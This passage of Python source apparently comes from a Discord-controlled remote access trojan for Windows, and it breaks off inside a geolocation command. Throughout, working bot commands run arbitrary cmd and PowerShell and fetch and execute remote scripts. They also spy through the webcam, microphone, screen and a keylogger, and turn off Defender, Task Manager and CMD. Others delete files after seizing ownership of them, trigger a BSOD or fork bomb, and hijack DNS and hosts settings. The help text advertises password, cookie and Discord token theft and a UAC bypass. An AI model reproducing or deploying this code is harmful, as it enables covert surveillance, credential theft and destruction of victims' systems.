`.speedtest`

**Terminal / Info:**
`.cmd`, `.powershell`, `.key <keys>`, `.scriptloader <url>`
`.admin-check`, `.ask-admin`, `.uac-bypass`, `.idle-time`
`.grab <passwords|history|discord|cookies|ip|all>`

**System:**
`.website <url>`, `.disable-taskmgr`, `.disable-cmd`
`.disable-defender`, `.deactivate-windows`
`.disable-reagentc`, `.set-date`, `.set-hour`
`.enable-device`, `.disable-device`

**Other Tools:**
`.sysinfo`, `.battery`, `.wifi`, `.drives`, `.startup`
`.window-list`, `.focus <title>`, `.close-window <title>`
`.clipboard`, `.set-clipboard <text>`
`.lock-pc`, `.sleep-pc`, `.restart-pc`, `.shutdown-pc`
`.beep`, `.notepad <text>`, `.screensaver`, `.taskbar <hide|show>`
`.desktop-icons <hide|show>`, `.mic-record <seconds>`
`.grab-url <url> [dest]`, `.installed`, `.services`

**Destructive:**
`.kill-pc`, `.implode`, `.exit`, `.update`, `.leave-all`, `.clean`
""", 0x9b59b6)

    await ctx.send(embed=embed1)
    await ctx.send(embed=embed2)
    await ctx.send(embed=embed3)


@bot.command()
async def volume(ctx, vol: int = None):
    if vol is None:
        await ctx.send(embed=create_embed("Error", "Usage: `.volume <0-100>`", 0xff0000))
        return
    if set_volume_level(vol / 100):
        await ctx.send(embed=create_embed("🔊 Volume", f"Volume set to **{vol}%**.", 0x00ff00))
    else:
        await ctx.send(embed=create_embed("Error", "Could not change volume", 0xff0000))


@bot.command()
async def ss(ctx):
    await ctx.message.add_reaction("📌")
    path = screenshot_all()
    if path:
        file_name = os.path.basename(path)
        embed = create_embed("📸 Screenshot taken", "Screenshot attached.", 0x0084FF)
        embed.set_image(url=f"attachment://{file_name}")
        await ctx.send(embed=embed, file=discord.File(path, filename=file_name))
        os.remove(path)


@bot.command()
async def screenrec(ctx, seconds: int = 30):
    if seconds > 300:
        seconds = 300
    await ctx.message.add_reaction("📌")
    await ctx.send(f"`🎥` Recording for **{seconds}** seconds...")
    try:
        import imageio
        frames = []
        start = time.time()
        while time.time() - start < seconds:
            frames.append(np.array(pyautogui.screenshot()))
        output_file = os.path.join(BASE_DIR, "recording.mp4")
        imageio.mimsave(output_file, frames, fps=10)
        await ctx.send(embed=create_embed("🎥 Screen recording", "Recording complete.", 0x0084ff),
                       file=discord.File(output_file))
        os.remove(output_file)
    except Exception as e:
        await ctx.send(f"Error: {e}")


@bot.command(aliases=["list-cams"])
async def list_cams(ctx):
    cams = list_cameras()
    msg = "\n".join([f"Camera **ID {i}**" for i in cams])
    await ctx.send(embed=create_embed("Cameras", msg or "No cameras found", 0x3498db))


@bot.command()
async def webcam(ctx):
    cap = cv2.VideoCapture(selected_camera)
    if cap.isOpened():
        ret, frame = cap.read()
        if ret:
            path = os.path.join(BASE_DIR, "webcam.png")
            cv2.imwrite(path, frame)
            embed = create_embed("📹 Webcam photo", f"Selected camera: **{selected_camera}**", 0x0084FF)
            embed.set_image(url="attachment://webcam.png")
            await ctx.send(embed=embed, file=discord.File(path, filename="webcam.png"))
            os.remove(path)
        cap.release()
    else:
        await ctx.send(embed=create_embed("Error", f"Could not access camera **{selected_camera}**.", 0xFF0000))


@bot.command(aliases=["sel-cam"])
async def sel_cam(ctx, num: int = None):
    global selected_camera
    if num is None:
        await ctx.send(embed=create_embed("Error", "Usage: `.sel-cam <id>`", 0xff0000))
        return
    selected_camera = num
    await ctx.send(embed=create_embed("📹 Camera", f"Selected camera **{num}**.", 0x00ff00))


@bot.command(aliases=["list-mics", "microphones"])
async def list_microphones(ctx):
    await ctx.message.add_reaction("🎙️")
    try:
        mics = get_input_devices()
        lines = [f"{i}. {m['name']}" for i, m in enumerate(mics)]
        await ctx.send(embed=create_embed("🎙️ Microphones", f"```{chr(10).join(lines) or 'None'}```", 0x0084ff))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command(aliases=["sel-mic", "selmic"])
async def sel_mic(ctx, num: int = None):
    global selected_mic
    mics = get_input_devices()
    if num is None or not (0 <= num < len(mics)):
        lines = [f"{i}. {m['name']}" for i, m in enumerate(mics)]
        await ctx.send(embed=create_embed("🎙️ Microphones", f"```{chr(10).join(lines) or 'None'}```", 0x0084ff))
        return
    selected_mic = mics[num]["index"]
    await ctx.send(embed=create_embed("🎙️ Microphone", f"Selected: `{mics[num]['name']}`", 0x00ff00))


@bot.command(aliases=["list-speakers"])
async def list_speakers(ctx):
    await ctx.message.add_reaction("🔊")
    ps_script = "Get-AudioDevice -List | Where-Object { $_.Type -eq 'Playback' } | Select-Object Index, Name, Default | ConvertTo-Json -Compress"
    try:
        result = ps(ps_script)
        devices = json.loads(result.stdout.strip())
        if isinstance(devices, dict):
            devices = [devices]
        lines = [f"{d['Index']}. {'[DEFAULT] ' if d.get('Default') else ''}{d['Name']}" for d in devices]
        embed = create_embed("🔊 Speakers", f"```{chr(10).join(lines)}```", 0x0084ff)
    except Exception as e:
        embed = create_embed("Error", str(e), 0xff0000)
    await ctx.send(embed=embed)


@bot.command(aliases=["change-output", "set-speaker"])
async def change_output(ctx, target: str = None):
    if not target:
        await ctx.send(embed=create_embed("Error", "Usage: `.change-output <index | name>`", 0xffa500))
        return
    ps_script = f'''
if (-not (Get-Module -ListAvailable AudioDeviceCmdlets)) {{
    Install-Module -Name AudioDeviceCmdlets -Scope CurrentUser -Force -AllowClobber | Out-Null
}}
if ('{target}' -as [int]) {{
    Set-AudioDevice -Index {target}
}} else {{
    $dev = Get-AudioDevice -List | Where-Object {{ $_.Type -eq 'Playback' -and $_.Name -like '*{target}*' }} | Select-Object -First 1
    if ($dev) {{ Set-AudioDevice -Index $dev.Index }} else {{ Write-Output "NOT_FOUND" }}
}}
'''
    result = ps(ps_script)
    if "NOT_FOUND" in result.stdout:
        await ctx.send(embed=create_embed("Error", f"Device **{target}** not found.", 0xff0000))
    else:
        await ctx.send(embed=create_embed("🔊 Output", f"Default device set to `{target}`.", 0x0084ff))


def _voice_watchdog(channel_id, mic_name):
    while voice_reconnect:
        time.sleep(3)
        try:
            vc = voice_client
            if vc and vc.is_connected() and not vc.is_playing():
                source = discord.FFmpegPCMAudio(
                    source=f"audio={mic_name}",
                    executable=FFMPEG_BIN,
                    before_options="-f dshow -rtbufsize 100M",
                    options="-ac 2 -ar 48000"
                )
                vc.play(source)
        except Exception:
            pass


@bot.command()
async def join(ctx):
    global voice_client, voice_reconnect

    guild = ctx.guild

    vc = guild.get_channel(cfg_get(guild.id, "livemic"))

    if not vc:
        await ctx.send(embed=create_embed("Error", "Channel **Live microphone** not found.", 0xff0000))
        return

    mics = get_input_devices()
    if not mics:
        await ctx.send(embed=create_embed("Error", "No microphone available.", 0xff0000))
        return

    if selected_mic is None:
        mic_name = mics[0]["name"]
    else:
        mic_name = next((m["name"] for m in mics if m["index"] == selected_mic), mics[0]["name"])

    try:
        client = ctx.voice_client
        if not client or not client.is_connected():
            client = await vc.connect(self_deaf=False)
        else:
            await client.move_to(vc)

        voice_client = client
        voice_reconnect = True

        if client.is_playing():
            client.stop()

        audio_source = discord.FFmpegPCMAudio(
            source=f"audio={mic_name}",
            executable=FFMPEG_BIN,
            before_options="-f dshow -rtbufsize 100M",
            options="-ac 2 -ar 48000"
        )

        client.play(audio_source)

        await ctx.send(embed=create_embed(
            "🎙️ Audio Stream Started",
            f"Connected to **{vc.name}**.\n**Microphone:** `{mic_name}`",
            0x00ff00
        ))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))

@bot.command(aliases=["leave", "dc"])
async def disconnect(ctx):
    global voice_reconnect
    voice_reconnect = False
    vc = ctx.voice_client
    if not vc or not vc.is_connected():
        await ctx.send(embed=create_embed("Error", "Not connected to voice.", 0xff0000))
        return
    name = vc.channel.name
    await vc.disconnect()
    await ctx.send(embed=create_embed("🔌 Disconnected", f"Left **{name}**.", 0x00ff00))


@bot.command(aliases=["block-input"])
async def block_input(ctx, seconds: int = None):
    global input_blocked, keyboard_listener, mouse_listener
    if input_blocked:
        await ctx.send("Already blocked")
        return
    await ctx.message.add_reaction("📌")
    if seconds is None:
        keyboard_listener = keyboard.Listener(suppress=True)
        mouse_listener = mouse.Listener(suppress=True)
        keyboard_listener.start()
        mouse_listener.start()
        input_blocked = True
        await ctx.send(embed=create_embed("⌨️ Input blocked", "Blocked permanently.", 0xff0000))
    else:
        def block_temp():
            global input_blocked
            k = keyboard.Listener(suppress=True)
            m = mouse.Listener(suppress=True)
            k.start()
            m.start()
            time.sleep(seconds)
            k.stop()
            m.stop()
            input_blocked = False
        input_blocked = True
        threading.Thread(target=block_temp, daemon=True).start()
        await ctx.send(embed=create_embed("⌨️ Input blocked", f"Blocked for **{seconds}** seconds.", 0xff0000))


@bot.command(aliases=["unblock-input"])
async def unblock_input(ctx):
    global input_blocked, keyboard_listener, mouse_listener
    if not input_blocked:
        await ctx.send("`🚫` Input already unlocked.")
        return
    if keyboard_listener:
        keyboard_listener.stop()
    if mouse_listener:
        mouse_listener.stop()
    input_blocked = False
    await ctx.send(embed=create_embed("⌨️ Input Unblocked", "Unblocked.", 0x00ff00))


@bot.command(aliases=["hide-cursor"])
async def hide_cursor(ctx):
    ctypes.windll.user32.ShowCursor(False)
    await ctx.send(embed=create_embed("🖱️ Cursor", "Cursor hidden.", 0x00ff00))


@bot.command(aliases=["show-cursor"])
async def show_cursor(ctx):
    ctypes.windll.user32.ShowCursor(True)
    await ctx.send(embed=create_embed("🖱️ Cursor", "Cursor shown.", 0x00ff00))


@bot.command(aliases=["monitors-off"])
async def monitors_off(ctx):
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
    await ctx.send(embed=create_embed("💻 Monitors", "Monitors off.", 0xff0000))


@bot.command(aliases=["monitors-on"])
async def monitors_on(ctx):
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
    await ctx.send(embed=create_embed("💻 Monitors", "Monitors on.", 0x00ff00))


@bot.command()
async def taskkill(ctx, *, process: str):
    subprocess.run(["taskkill", "/f", "/im", process], capture_output=True)
    await ctx.send(embed=create_embed("🚫 Taskkill", f"Killed **{process}**.", 0x27F542))


@bot.command()
async def tasklist(ctx):
    result = subprocess.run(["tasklist"], capture_output=True, text=True)
    for chunk in [result.stdout[i:i + 1900] for i in range(0, len(result.stdout), 1900)]:
        await ctx.send(f"```{chunk}```")


@bot.command(aliases=["kill-explorer"])
async def kill_explorer(ctx):
    subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], capture_output=True)
    await ctx.send(embed=create_embed("⛔ Explorer", "explorer.exe killed.", 0xff0000))


@bot.command(aliases=["start-explorer"])
async def start_explorer(ctx):
    subprocess.Popen(["start", "explorer.exe"], shell=True)
    await ctx.send(embed=create_embed("⛔ Explorer", "explorer.exe started.", 0x00ff00))


@bot.command(aliases=["set-critical"])
async def set_critical(ctx):
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
    await ctx.send(embed=create_embed("❗ Critical", "Process is now critical.", 0xff0000))


@bot.command(aliases=["unset-critical"])
async def unset_critical(ctx):
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
    await ctx.send(embed=create_embed("❗ Critical", "Critical disabled.", 0x00ff00))


@bot.command(aliases=["crazy-mouse"])
async def crazy_mouse(ctx):
    await ctx.message.add_reaction("🖱️")
    def crazy():
        for _ in range(200):
            ctypes.windll.user32.SetCursorPos(random.randint(0, 1920), random.randint(0, 1080))
            time.sleep(0.01)
    threading.Thread(target=crazy, daemon=True).start()
    await ctx.send(embed=create_embed("😵‍💫 Crazy Mouse", "Enabled for 2 seconds.", 0xf39c12))


@bot.command(aliases=["minimize-all"])
async def minimize_all(ctx):
    subprocess.run(["powershell", "-Command", "$w = New-Object -ComObject Shell.Application; $w.MinimizeAll()"], capture_output=True)
    await ctx.send(embed=create_embed("➖ Minimize", "All windows minimized.", 0x00ff00))


@bot.command()
async def bsod(ctx):
    await ctx.send(embed=create_embed("💀 BSOD", "Triggering BSOD...", 0x00ff00))
    await ctx.message.add_reaction("💀")
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_int()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        subprocess.run(["taskkill", "/F", "/IM", "svchost.exe"])
    except Exception:
        pass


@bot.command()
async def forkbomb(ctx):
    await ctx.message.add_reaction("💀")
    await ctx.send(embed=create_embed("🍽️ Forkbomb", "Forkbomb started.", 0xff0000))
    while True:
        subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)


@bot.command()
async def jumpscare(ctx):
    temp_file = os.path.join(RESOURCES_DIR, "jump.mp4")
    if not os.path.exists(temp_file):
        temp_file = os.path.join(os.getcwd(), "jump.mp4")
    if not os.path.exists(temp_file):
        await ctx.send(embed=create_embed("Error", "jump.mp4 not found.", 0xFF0000))
        return
    try:
        subprocess.Popen(f'start "" "{temp_file}"', shell=True)
        await asyncio.sleep(0.6)
        win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_MAXIMIZE)
        set_volume_level(1.0)
        await ctx.send(embed=create_embed("👻 Jumpscare", "Triggered.", 0xFF0000))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xFF0000))


@bot.command(aliases=["display-glitch"])
async def display_glitch(ctx, effect: str = None):
    if effect is None or effect == "list":
        await ctx.send(embed=create_embed("💻 Available Glitches", "".join(flash_screen("list")), 0x3498db))
        return
    if effect + "\n" in flash_screen("list"):
        threading.Thread(target=flash_screen, args=(effect,), daemon=True).start()
        await ctx.send(embed=create_embed("💻 Glitch Executed", f"Effect: **{effect}**.", 0x00ff00))
    else:
        await ctx.send(embed=create_embed("Error", "Invalid effect.", 0xff0000))


@bot.command(aliases=["windows-notification", "win-notify"])
async def windows_notification(ctx, title: str = None, *, message: str = None):
    if not title or not message:
        await ctx.send(embed=create_embed("Error", 'Usage: `.win-notify "<title>" <message>`', 0xffa500))
        return
    ps_script = (
        '[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms"); '
        '$notify = New-Object System.Windows.Forms.NotifyIcon; '
        '$notify.Icon = [System.Drawing.SystemIcons]::Information; '
        '$notify.Visible = $true; '
        f'$notify.ShowBalloonTip(5000, "{title}", "{message}", [System.Windows.Forms.ToolTipIcon]::Info); '
        'Start-Sleep -s 6; $notify.Dispose()'
    )
    ps(ps_script)
    await ctx.send(embed=create_embed("🔔 Notification", f"**{title}**\n{message}", 0x0084ff))


@bot.command()
async def play(ctx, *, file: str):
    subprocess.Popen(["start", file], shell=True)
    await ctx.send(embed=create_embed("🎵 Playing", file, 0x00ff00))


@bot.command(aliases=["speak"])
async def tts(ctx, *, message: str):
    subprocess.run(["powershell", "-Command",
                    f'Add-Type -AssemblyName System.Speech; $s = New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak("{message}")'],
                   capture_output=True)
    await ctx.send(embed=create_embed("🗣️ TTS", f"```{message[:50]}```", 0x00ff00))


@bot.command()
async def msg(ctx, type: int = None, title: str = None, *, message: str = None):
    if type is None or title is None or message is None:
        await ctx.send(embed=create_embed("💬 MsgBox", "Usage: `.msg <type> \"<title>\" \"<message>\"`", 0x00ff00))
        return
    safe_title = title.replace('"', '`"')
    safe_message = message.replace('"', '`"')
    subprocess.run(["powershell", "-Command",
                    f'Add-Type -AssemblyName Microsoft.VisualBasic; '
                    f'[Microsoft.VisualBasic.Interaction]::MsgBox("{safe_message}", "{type}", "{safe_title}")'],
                   capture_output=True)
    await ctx.send(embed=create_embed("💬 Message", f"**{title}**\n{message}", 0x00ff00))


@bot.command(aliases=["ls"])
async def dir(ctx):
    global current_dir
    try:
        files = os.listdir(current_dir)
        out = f"👤 **{current_dir}**\n\n"
        for f in files:
            full = os.path.join(current_dir, f)
            if os.path.isdir(full):
                out += f"`📂` `{f}/`\n"
            else:
                out += f"`📄` `{f}` ({os.path.getsize(full)} bytes)\n"
        await ctx.send(embed=create_embed("📁 Directory", out[:4000], 0x3498db))
    except Exception as e:
        await ctx.send(f"Error: {e}")


@bot.command()
async def cd(ctx, path: str):
    global current_dir
    try:
        if path == "..":
            current_dir = os.path.dirname(current_dir)
        elif os.path.isabs(path):
            current_dir = path
        else:
            current_dir = os.path.join(current_dir, path)
        current_dir = os.path.normpath(current_dir)
        await ctx.send(embed=create_embed("📁 Directory", f"Now: `{current_dir}`", 0x00ff00))
    except Exception as e:
        await ctx.send(f"Error: {e}")


@bot.command()
async def tree(ctx):
    global current_dir
    try:
        lines = tree_directory(current_dir)[:300]
        chunks, cur = [], ""
        for line in lines:
            if len(cur) + len(line) + 1 > 3900:
                chunks.append(cur)
                cur = ""
            cur += line + "\n"
        if cur:
            chunks.append(cur)
        for i, chunk in enumerate(chunks):
            await ctx.send(embed=create_embed(f"🌳 Tree {'(Part ' + str(i + 1) + ')' if len(chunks) > 1 else ''}", f"```{chunk}```", 0x3498db))
    except Exception as e:
        await ctx.send(f"Error: {e}")


@bot.command()
async def download(ctx, file: str):
    global current_dir
    path = os.path.join(current_dir, file) if not os.path.isabs(file) else file
    if not os.path.exists(path):
        await ctx.send(embed=create_embed("Error", "File does not exist", 0xff0000))
        return
    if os.path.getsize(path) < 20 * 1024 * 1024:
        await ctx.send(embed=create_embed("🔽 File", file, 0x00ff00), file=discord.File(path))
    else:
        link = upload_fileio(path)
        await ctx.send(embed=create_embed("📎 Link", link or "Upload failed", 0x00ff00))


@bot.command()
async def upload(ctx):
    global current_dir
    if not ctx.message.attachments:
        await ctx.send("📋 Attach a file")
        return
    for attachment in ctx.message.attachments:
        await attachment.save(os.path.join(current_dir, attachment.filename))
        await ctx.send(embed=create_embed("⬆️ Uploaded", f"`{attachment.filename}` -> `{current_dir}`", 0x00ff00))


@bot.command()
async def remove(ctx, *, file: str):
    global current_dir
    path = os.path.join(current_dir, file) if not os.path.isabs(file) else file
    try:
        if os.path.isdir(path):
            shutil.rmtree(path)
        else:
            os.remove(path)
        await ctx.send(embed=create_embed("🗑️ Deleted", file))
    except PermissionError:
        subprocess.run(["takeown", "/f", path, "/r"], capture_output=True)
        subprocess.run(["icacls", path, "/grant", "everyone:F", "/t"], capture_output=True)
        try:
            shutil.rmtree(path) if os.path.isdir(path) else os.remove(path)
            await ctx.send(embed=create_embed("🗑️ Deleted", f"{file} (with permissions)"))
        except Exception as e:
            await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def open(ctx, *, file: str):
    global current_dir
    path = os.path.join(current_dir, file) if not os.path.isabs(file) else file
    subprocess.Popen(["start", "", path], shell=True)
    await ctx.send(embed=create_embed("📬 Opened", file, 0x00ff00))


@bot.command(aliases=["clear-bin"])
async def empty_bin(ctx):
    ps("Clear-RecycleBin -Force -ErrorAction SilentlyContinue")
    await ctx.send(embed=create_embed("🗑️ Recycle Bin", "Emptied.", 0x0084ff))


@bot.command(aliases=["set-wallpaper", "wallpaper"])
async def set_wallpaper(ctx, *, source: str = None):
    global current_dir
    if not source:
        await ctx.send(embed=create_embed("Error", "Usage: `.wallpaper <file|url>`", 0xffa500))
        return
    if source.startswith("http"):
        target_path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "wallpaper_temp.jpg")
        async with aiohttp.ClientSession() as session:
            async with session.get(source) as resp:
                with builtins.open(target_path, "wb") as f:
                    f.write(await resp.read())
    else:
        target_path = os.path.abspath(os.path.join(current_dir, source) if not os.path.isabs(source) else source)
    cmd = (f'Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices; public class W '
           f'{{ [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int a, int u, string p, int f); }}\'; '
           f'[W]::SystemParametersInfo(20, 0, \'{target_path}\', 3)')
    ps(cmd)
    await ctx.send(embed=create_embed("🖼️ Wallpaper", "Updated.", 0x0084ff))


@bot.command(aliases=["scriptloader"])
async def script_loader(ctx, url: str = None):
    if not url:
        await ctx.send(embed=create_embed("Error", "Usage: `.scriptloader <url>`", 0xffa500))
        return
    ext = ".ps1" if url.lower().endswith(".ps1") else ".bat" if url.lower().endswith(".bat") else None
    if not ext:
        await ctx.send(embed=create_embed("Error", "URL must end with .bat or .ps1", 0xff0000))
        return
    path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), f"loaded_script{ext}")
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            with builtins.open(path, "wb") as f:
                f.write(await resp.read())
    cmd = f'powershell -ExecutionPolicy Bypass -File "{path}"' if ext == ".ps1" else f'cmd.exe /c "{path}"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    out = ((result.stdout or "") + (result.stderr or ""))[-1900:] or "Executed (no output)"
    await ctx.send(embed=create_embed("⚙️ Script Executed", f"```{out}```", 0x0084ff))


@bot.command()
async def blacklist(ctx, *, process: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT 1 FROM blacklist WHERE process_name = ?", (process,))
    if c.fetchone():
        await ctx.send(embed=create_embed("Error", "Already in list", 0xFF0000))
    else:
        c.execute("INSERT INTO blacklist VALUES (?)", (process,))
        conn.commit()
        await ctx.send(embed=create_embed("🚫 Blacklist", f"Blocked **{process}**.", 0xFF0000))
    conn.close()


@bot.command()
async def unblacklist(ctx, *, process: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM blacklist WHERE process_name = ?", (process,))
    conn.commit()
    conn.close()
    await ctx.send(embed=create_embed("✅ Unblacklist", f"Unblocked **{process}**.", 0x00FF00))


@bot.command(aliases=["block-domain"])
async def block_domain(ctx, *, domain: str):
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
    with builtins.open(hosts_path, "a") as f:
        f.write(f"\n127.0.0.1 {domain}\n")
    await ctx.send(embed=create_embed("🚫 Domain Blocked", domain, 0xff0000))


@bot.command(aliases=["unblock-domain"])
async def unblock_domain(ctx, *, domain: str):
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
    with builtins.open(hosts_path, "r") as f:
        lines = f.readlines()
    with builtins.open(hosts_path, "w") as f:
        for line in lines:
            if domain not in line:
                f.write(line)
    await ctx.send(embed=create_embed("✅ Domain Unblocked", domain, 0x00ff00))


@bot.command(aliases=["block-website"])
async def block_website(ctx, *, url: str):
    await block_domain(ctx, domain=url.replace("https://", "").replace("http://", "").split("/")[0])


@bot.command(aliases=["unblock-website"])
async def unblock_website(ctx, *, url: str):
    await unblock_domain(ctx, domain=url.replace("https://", "").replace("http://", "").split("/")[0])


@bot.command(aliases=["ip-locate"])
async def ip_locate(ctx):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.ipify.org") as r:
                ip_addr = await r.text()
            async with session.get(f"http://ip-api.com/json/{ip_addr}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query") as r:
                data = await r.json()
        if data.get("status") != "success":
            await ctx.send(embed=create_embed("Error", data.get("message", "Unknown"), 0xff0000))
            return
        e = create_embed("📍 IP Information", "", 0x3498db)
        e.add_field(name="IP", value=f"```{data.get('query')}```", inline=False)
        e.add_field(name="City", value=data.get("city") or "N/A", inline=True)
        e.add_field(name="Country", value=data.get("country") or "N/A", inline=True)
        e.add_field(name="Coordinates", value=f"{data.get('lat')}, {data.get('lon')}", inline=True)
        e.add_field(name="ISP", value=data.get("isp") or "N/A", inline=False)
        e.add_field(name="AS", value=data.get("as") or "N/A", inline=False)
        await ctx.send(embed=e)
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command(aliases=["admin-check"])
async def admin_check(ctx):
    if is_admin():
        await ctx.send(embed=create_embed("👔 Admin", "Running as admin.", 0x00ff00))
    else:
        await ctx.send(embed=create_embed("👔 No admin", "Not admin.", 0xff0000))


@bot.command(aliases=["idle-time"])
async def idle_time(ctx):
    await ctx.send(embed=create_embed("⌚ Idle Time", f"**{int(get_idle_time())}** seconds.", 0x3498db))


@bot.command()
async def cmd(ctx, *, command: str):
    await ctx.message.add_reaction("📌")
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    out = ((result.stdout or "") + (result.stderr or ""))[-1900:] or "Executed (no output)"
    await ctx.send(embed=create_embed("⬛ CMD", f"```{out}```", 0x0084ff))


@bot.command()
async def powershell(ctx, *, command: str):
    await ctx.message.add_reaction("📌")
    result = ps(command)
    out = ((result.stdout or "") + (result.stderr or ""))[-1900:] or "Executed (no output)"
    await ctx.send(embed=create_embed("🟦 PowerShell", f"```{out}```", 0x0084ff))


@bot.command()
async def key(ctx, *, keys: str):
    text = keys.replace("[ENTER]", "\n").replace("[SPACE]", " ").replace("[TAB]", "\t").replace("[ESC]", "\x1b")
    pyautogui.typewrite(text, interval=0.01)
    await ctx.send(embed=create_embed("Keys", f"Sent: `{keys[:50]}`", 0x00ff00))


@bot.command(aliases=["keylogger-enable"])
async def keylogger_enable(ctx):
    global keylogger_active
    keylogger_active = True
    await ctx.send(embed=create_embed("🎹 Keylogger", "Enabled", 0x00ff00))


@bot.command(aliases=["keylogger-disable"])
async def keylogger_disable(ctx):
    global keylogger_active
    keylogger_active = False
    await ctx.send(embed=create_embed("🎹 Keylogger", "Disabled", 0xff0000))


@bot.command(aliases=["keylog"])
async def keylog_dump(ctx):
    if flush_keylog():
        await ctx.send(embed=create_embed("🎹 Keylogger", "Buffer flushed to #keys.", 0x00ff00))
    else:
        await ctx.send(embed=create_embed("🎹 Keylogger", "Buffer empty.", 0x3498db))


@bot.command(aliases=["record"])
async def record_now(ctx, seconds: int = 10):
    await ctx.message.add_reaction("🎙️")
    try:
        await asyncio.to_thread(record_and_send, seconds)
        await ctx.send(embed=create_embed("🎙️ Recording", f"{seconds}s sent to #microphone.", 0x0084ff))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def website(ctx, *, url: str):
    subprocess.Popen(["start", url], shell=True)
    await ctx.send(embed=create_embed("🌐 Web", f"Opening: {url}", 0x00ff00))


@bot.command(aliases=["disable-cmd"])
async def disable_cmd(ctx):
    os.system('reg add "HKCU\\Software\\Policies\\Microsoft\\Windows\\System" /v DisableCMD /t REG_DWORD /d 1 /f')
    await ctx.send(embed=create_embed("💻 CMD", "Disabled.", 0xff0000))


@bot.command(aliases=["enable-cmd"])
async def enable_cmd(ctx):
    os.system('reg add "HKCU\\Software\\Policies\\Microsoft\\Windows\\System" /v DisableCMD /t REG_DWORD /d 0 /f')
    await ctx.send(embed=create_embed("💻 CMD", "Enabled.", 0x00ff00))


@bot.command(aliases=["disable-taskmgr"])
async def disable_taskmgr(ctx):
    os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
    os.system("taskkill /f /im taskmgr.exe")
    await ctx.send(embed=create_embed("📊 Task Manager", "Disabled.", 0xFF0000))


@bot.command(aliases=["enable-taskmgr"])
async def enable_taskmgr(ctx):
    os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f')
    await ctx.send(embed=create_embed("📊 Task Manager", "Enabled.", 0x00ff00))


@bot.command(aliases=["disable-defender"])
async def disable_defender(ctx):
    ps("Set-MpPreference -DisableRealtimeMonitoring $true")
    await ctx.send(embed=create_embed("🛡️ Defender", "Real-time protection disabled.", 0xff0000))


@bot.command(aliases=["enable-defender"])
async def enable_defender(ctx):
    ps("Set-MpPreference -DisableRealtimeMonitoring $false")
    await ctx.send(embed=create_embed("🛡️ Defender", "Real-time protection enabled.", 0x00ff00))


@bot.command(aliases=["deactivate-windows"])
async def deactivate_windows(ctx):
    subprocess.run(["cscript", "//nologo", r"C:\Windows\System32\slmgr.vbs", "/upk"],
                   capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    await ctx.send(embed=create_embed("🪟 Windows", "Deactivated.", 0xff0000))


@bot.command(aliases=["disable-reagentc"])
async def disable_reagentc(ctx):
    subprocess.run(["reagentc", "/disable"], capture_output=True)
    await ctx.send(embed=create_embed("🟣 ReAgentC", "Disabled.", 0xff0000))


@bot.command(aliases=["enable-reagentc"])
async def enable_reagentc(ctx):
    subprocess.run(["reagentc", "/enable"], capture_output=True)
    await ctx.send(embed=create_embed("🟣 ReAgentC", "Enabled.", 0x00ff00))


@bot.command(aliases=["kill-pc"])
async def kill_pc(ctx):
    await ctx.send(embed=create_embed("🚨 Confirmation", "Type `confirm-kill` to destroy the system.", 0xff0000))


@bot.command(aliases=["set-dns"])
async def dns(ctx, dns1: str = None, dns2: str = None):
    if not dns1:
        await ctx.send(embed=create_embed("Error", "Usage: `.set-dns <primary> [secondary]`", 0xffa500))
        return
    await ctx.message.add_reaction("🌐")
    dns_list = f'"{dns1}"' if not dns2 else f'"{dns1}","{dns2}"'
    ps_script = f'''
$adapters = Get-NetAdapter | Where-Object {{ $_.Status -eq "Up" }}
foreach ($adapter in $adapters) {{
    Set-DnsClientServerAddress -InterfaceIndex $adapter.ifIndex -ServerAddresses ({dns_list}) -ErrorAction SilentlyContinue
}}
'''
    result = ps(ps_script)
    if result.returncode == 0:
        await ctx.send(embed=create_embed("🌐 DNS Updated", f"Primary: `{dns1}`", 0x0084ff))
    else:
        await ctx.send(embed=create_embed("Error", result.stderr[-1900:], 0xff0000))


@bot.command(aliases=["coords", "coordinates"])
async def get_coords(ctx):
    await ctx.message.add_reaction("📍")
    ps_script = r'''
Add-Type -AssemblyName System.Device
$w = New-Object System.Device.Location.GeoCoordinateWatcher
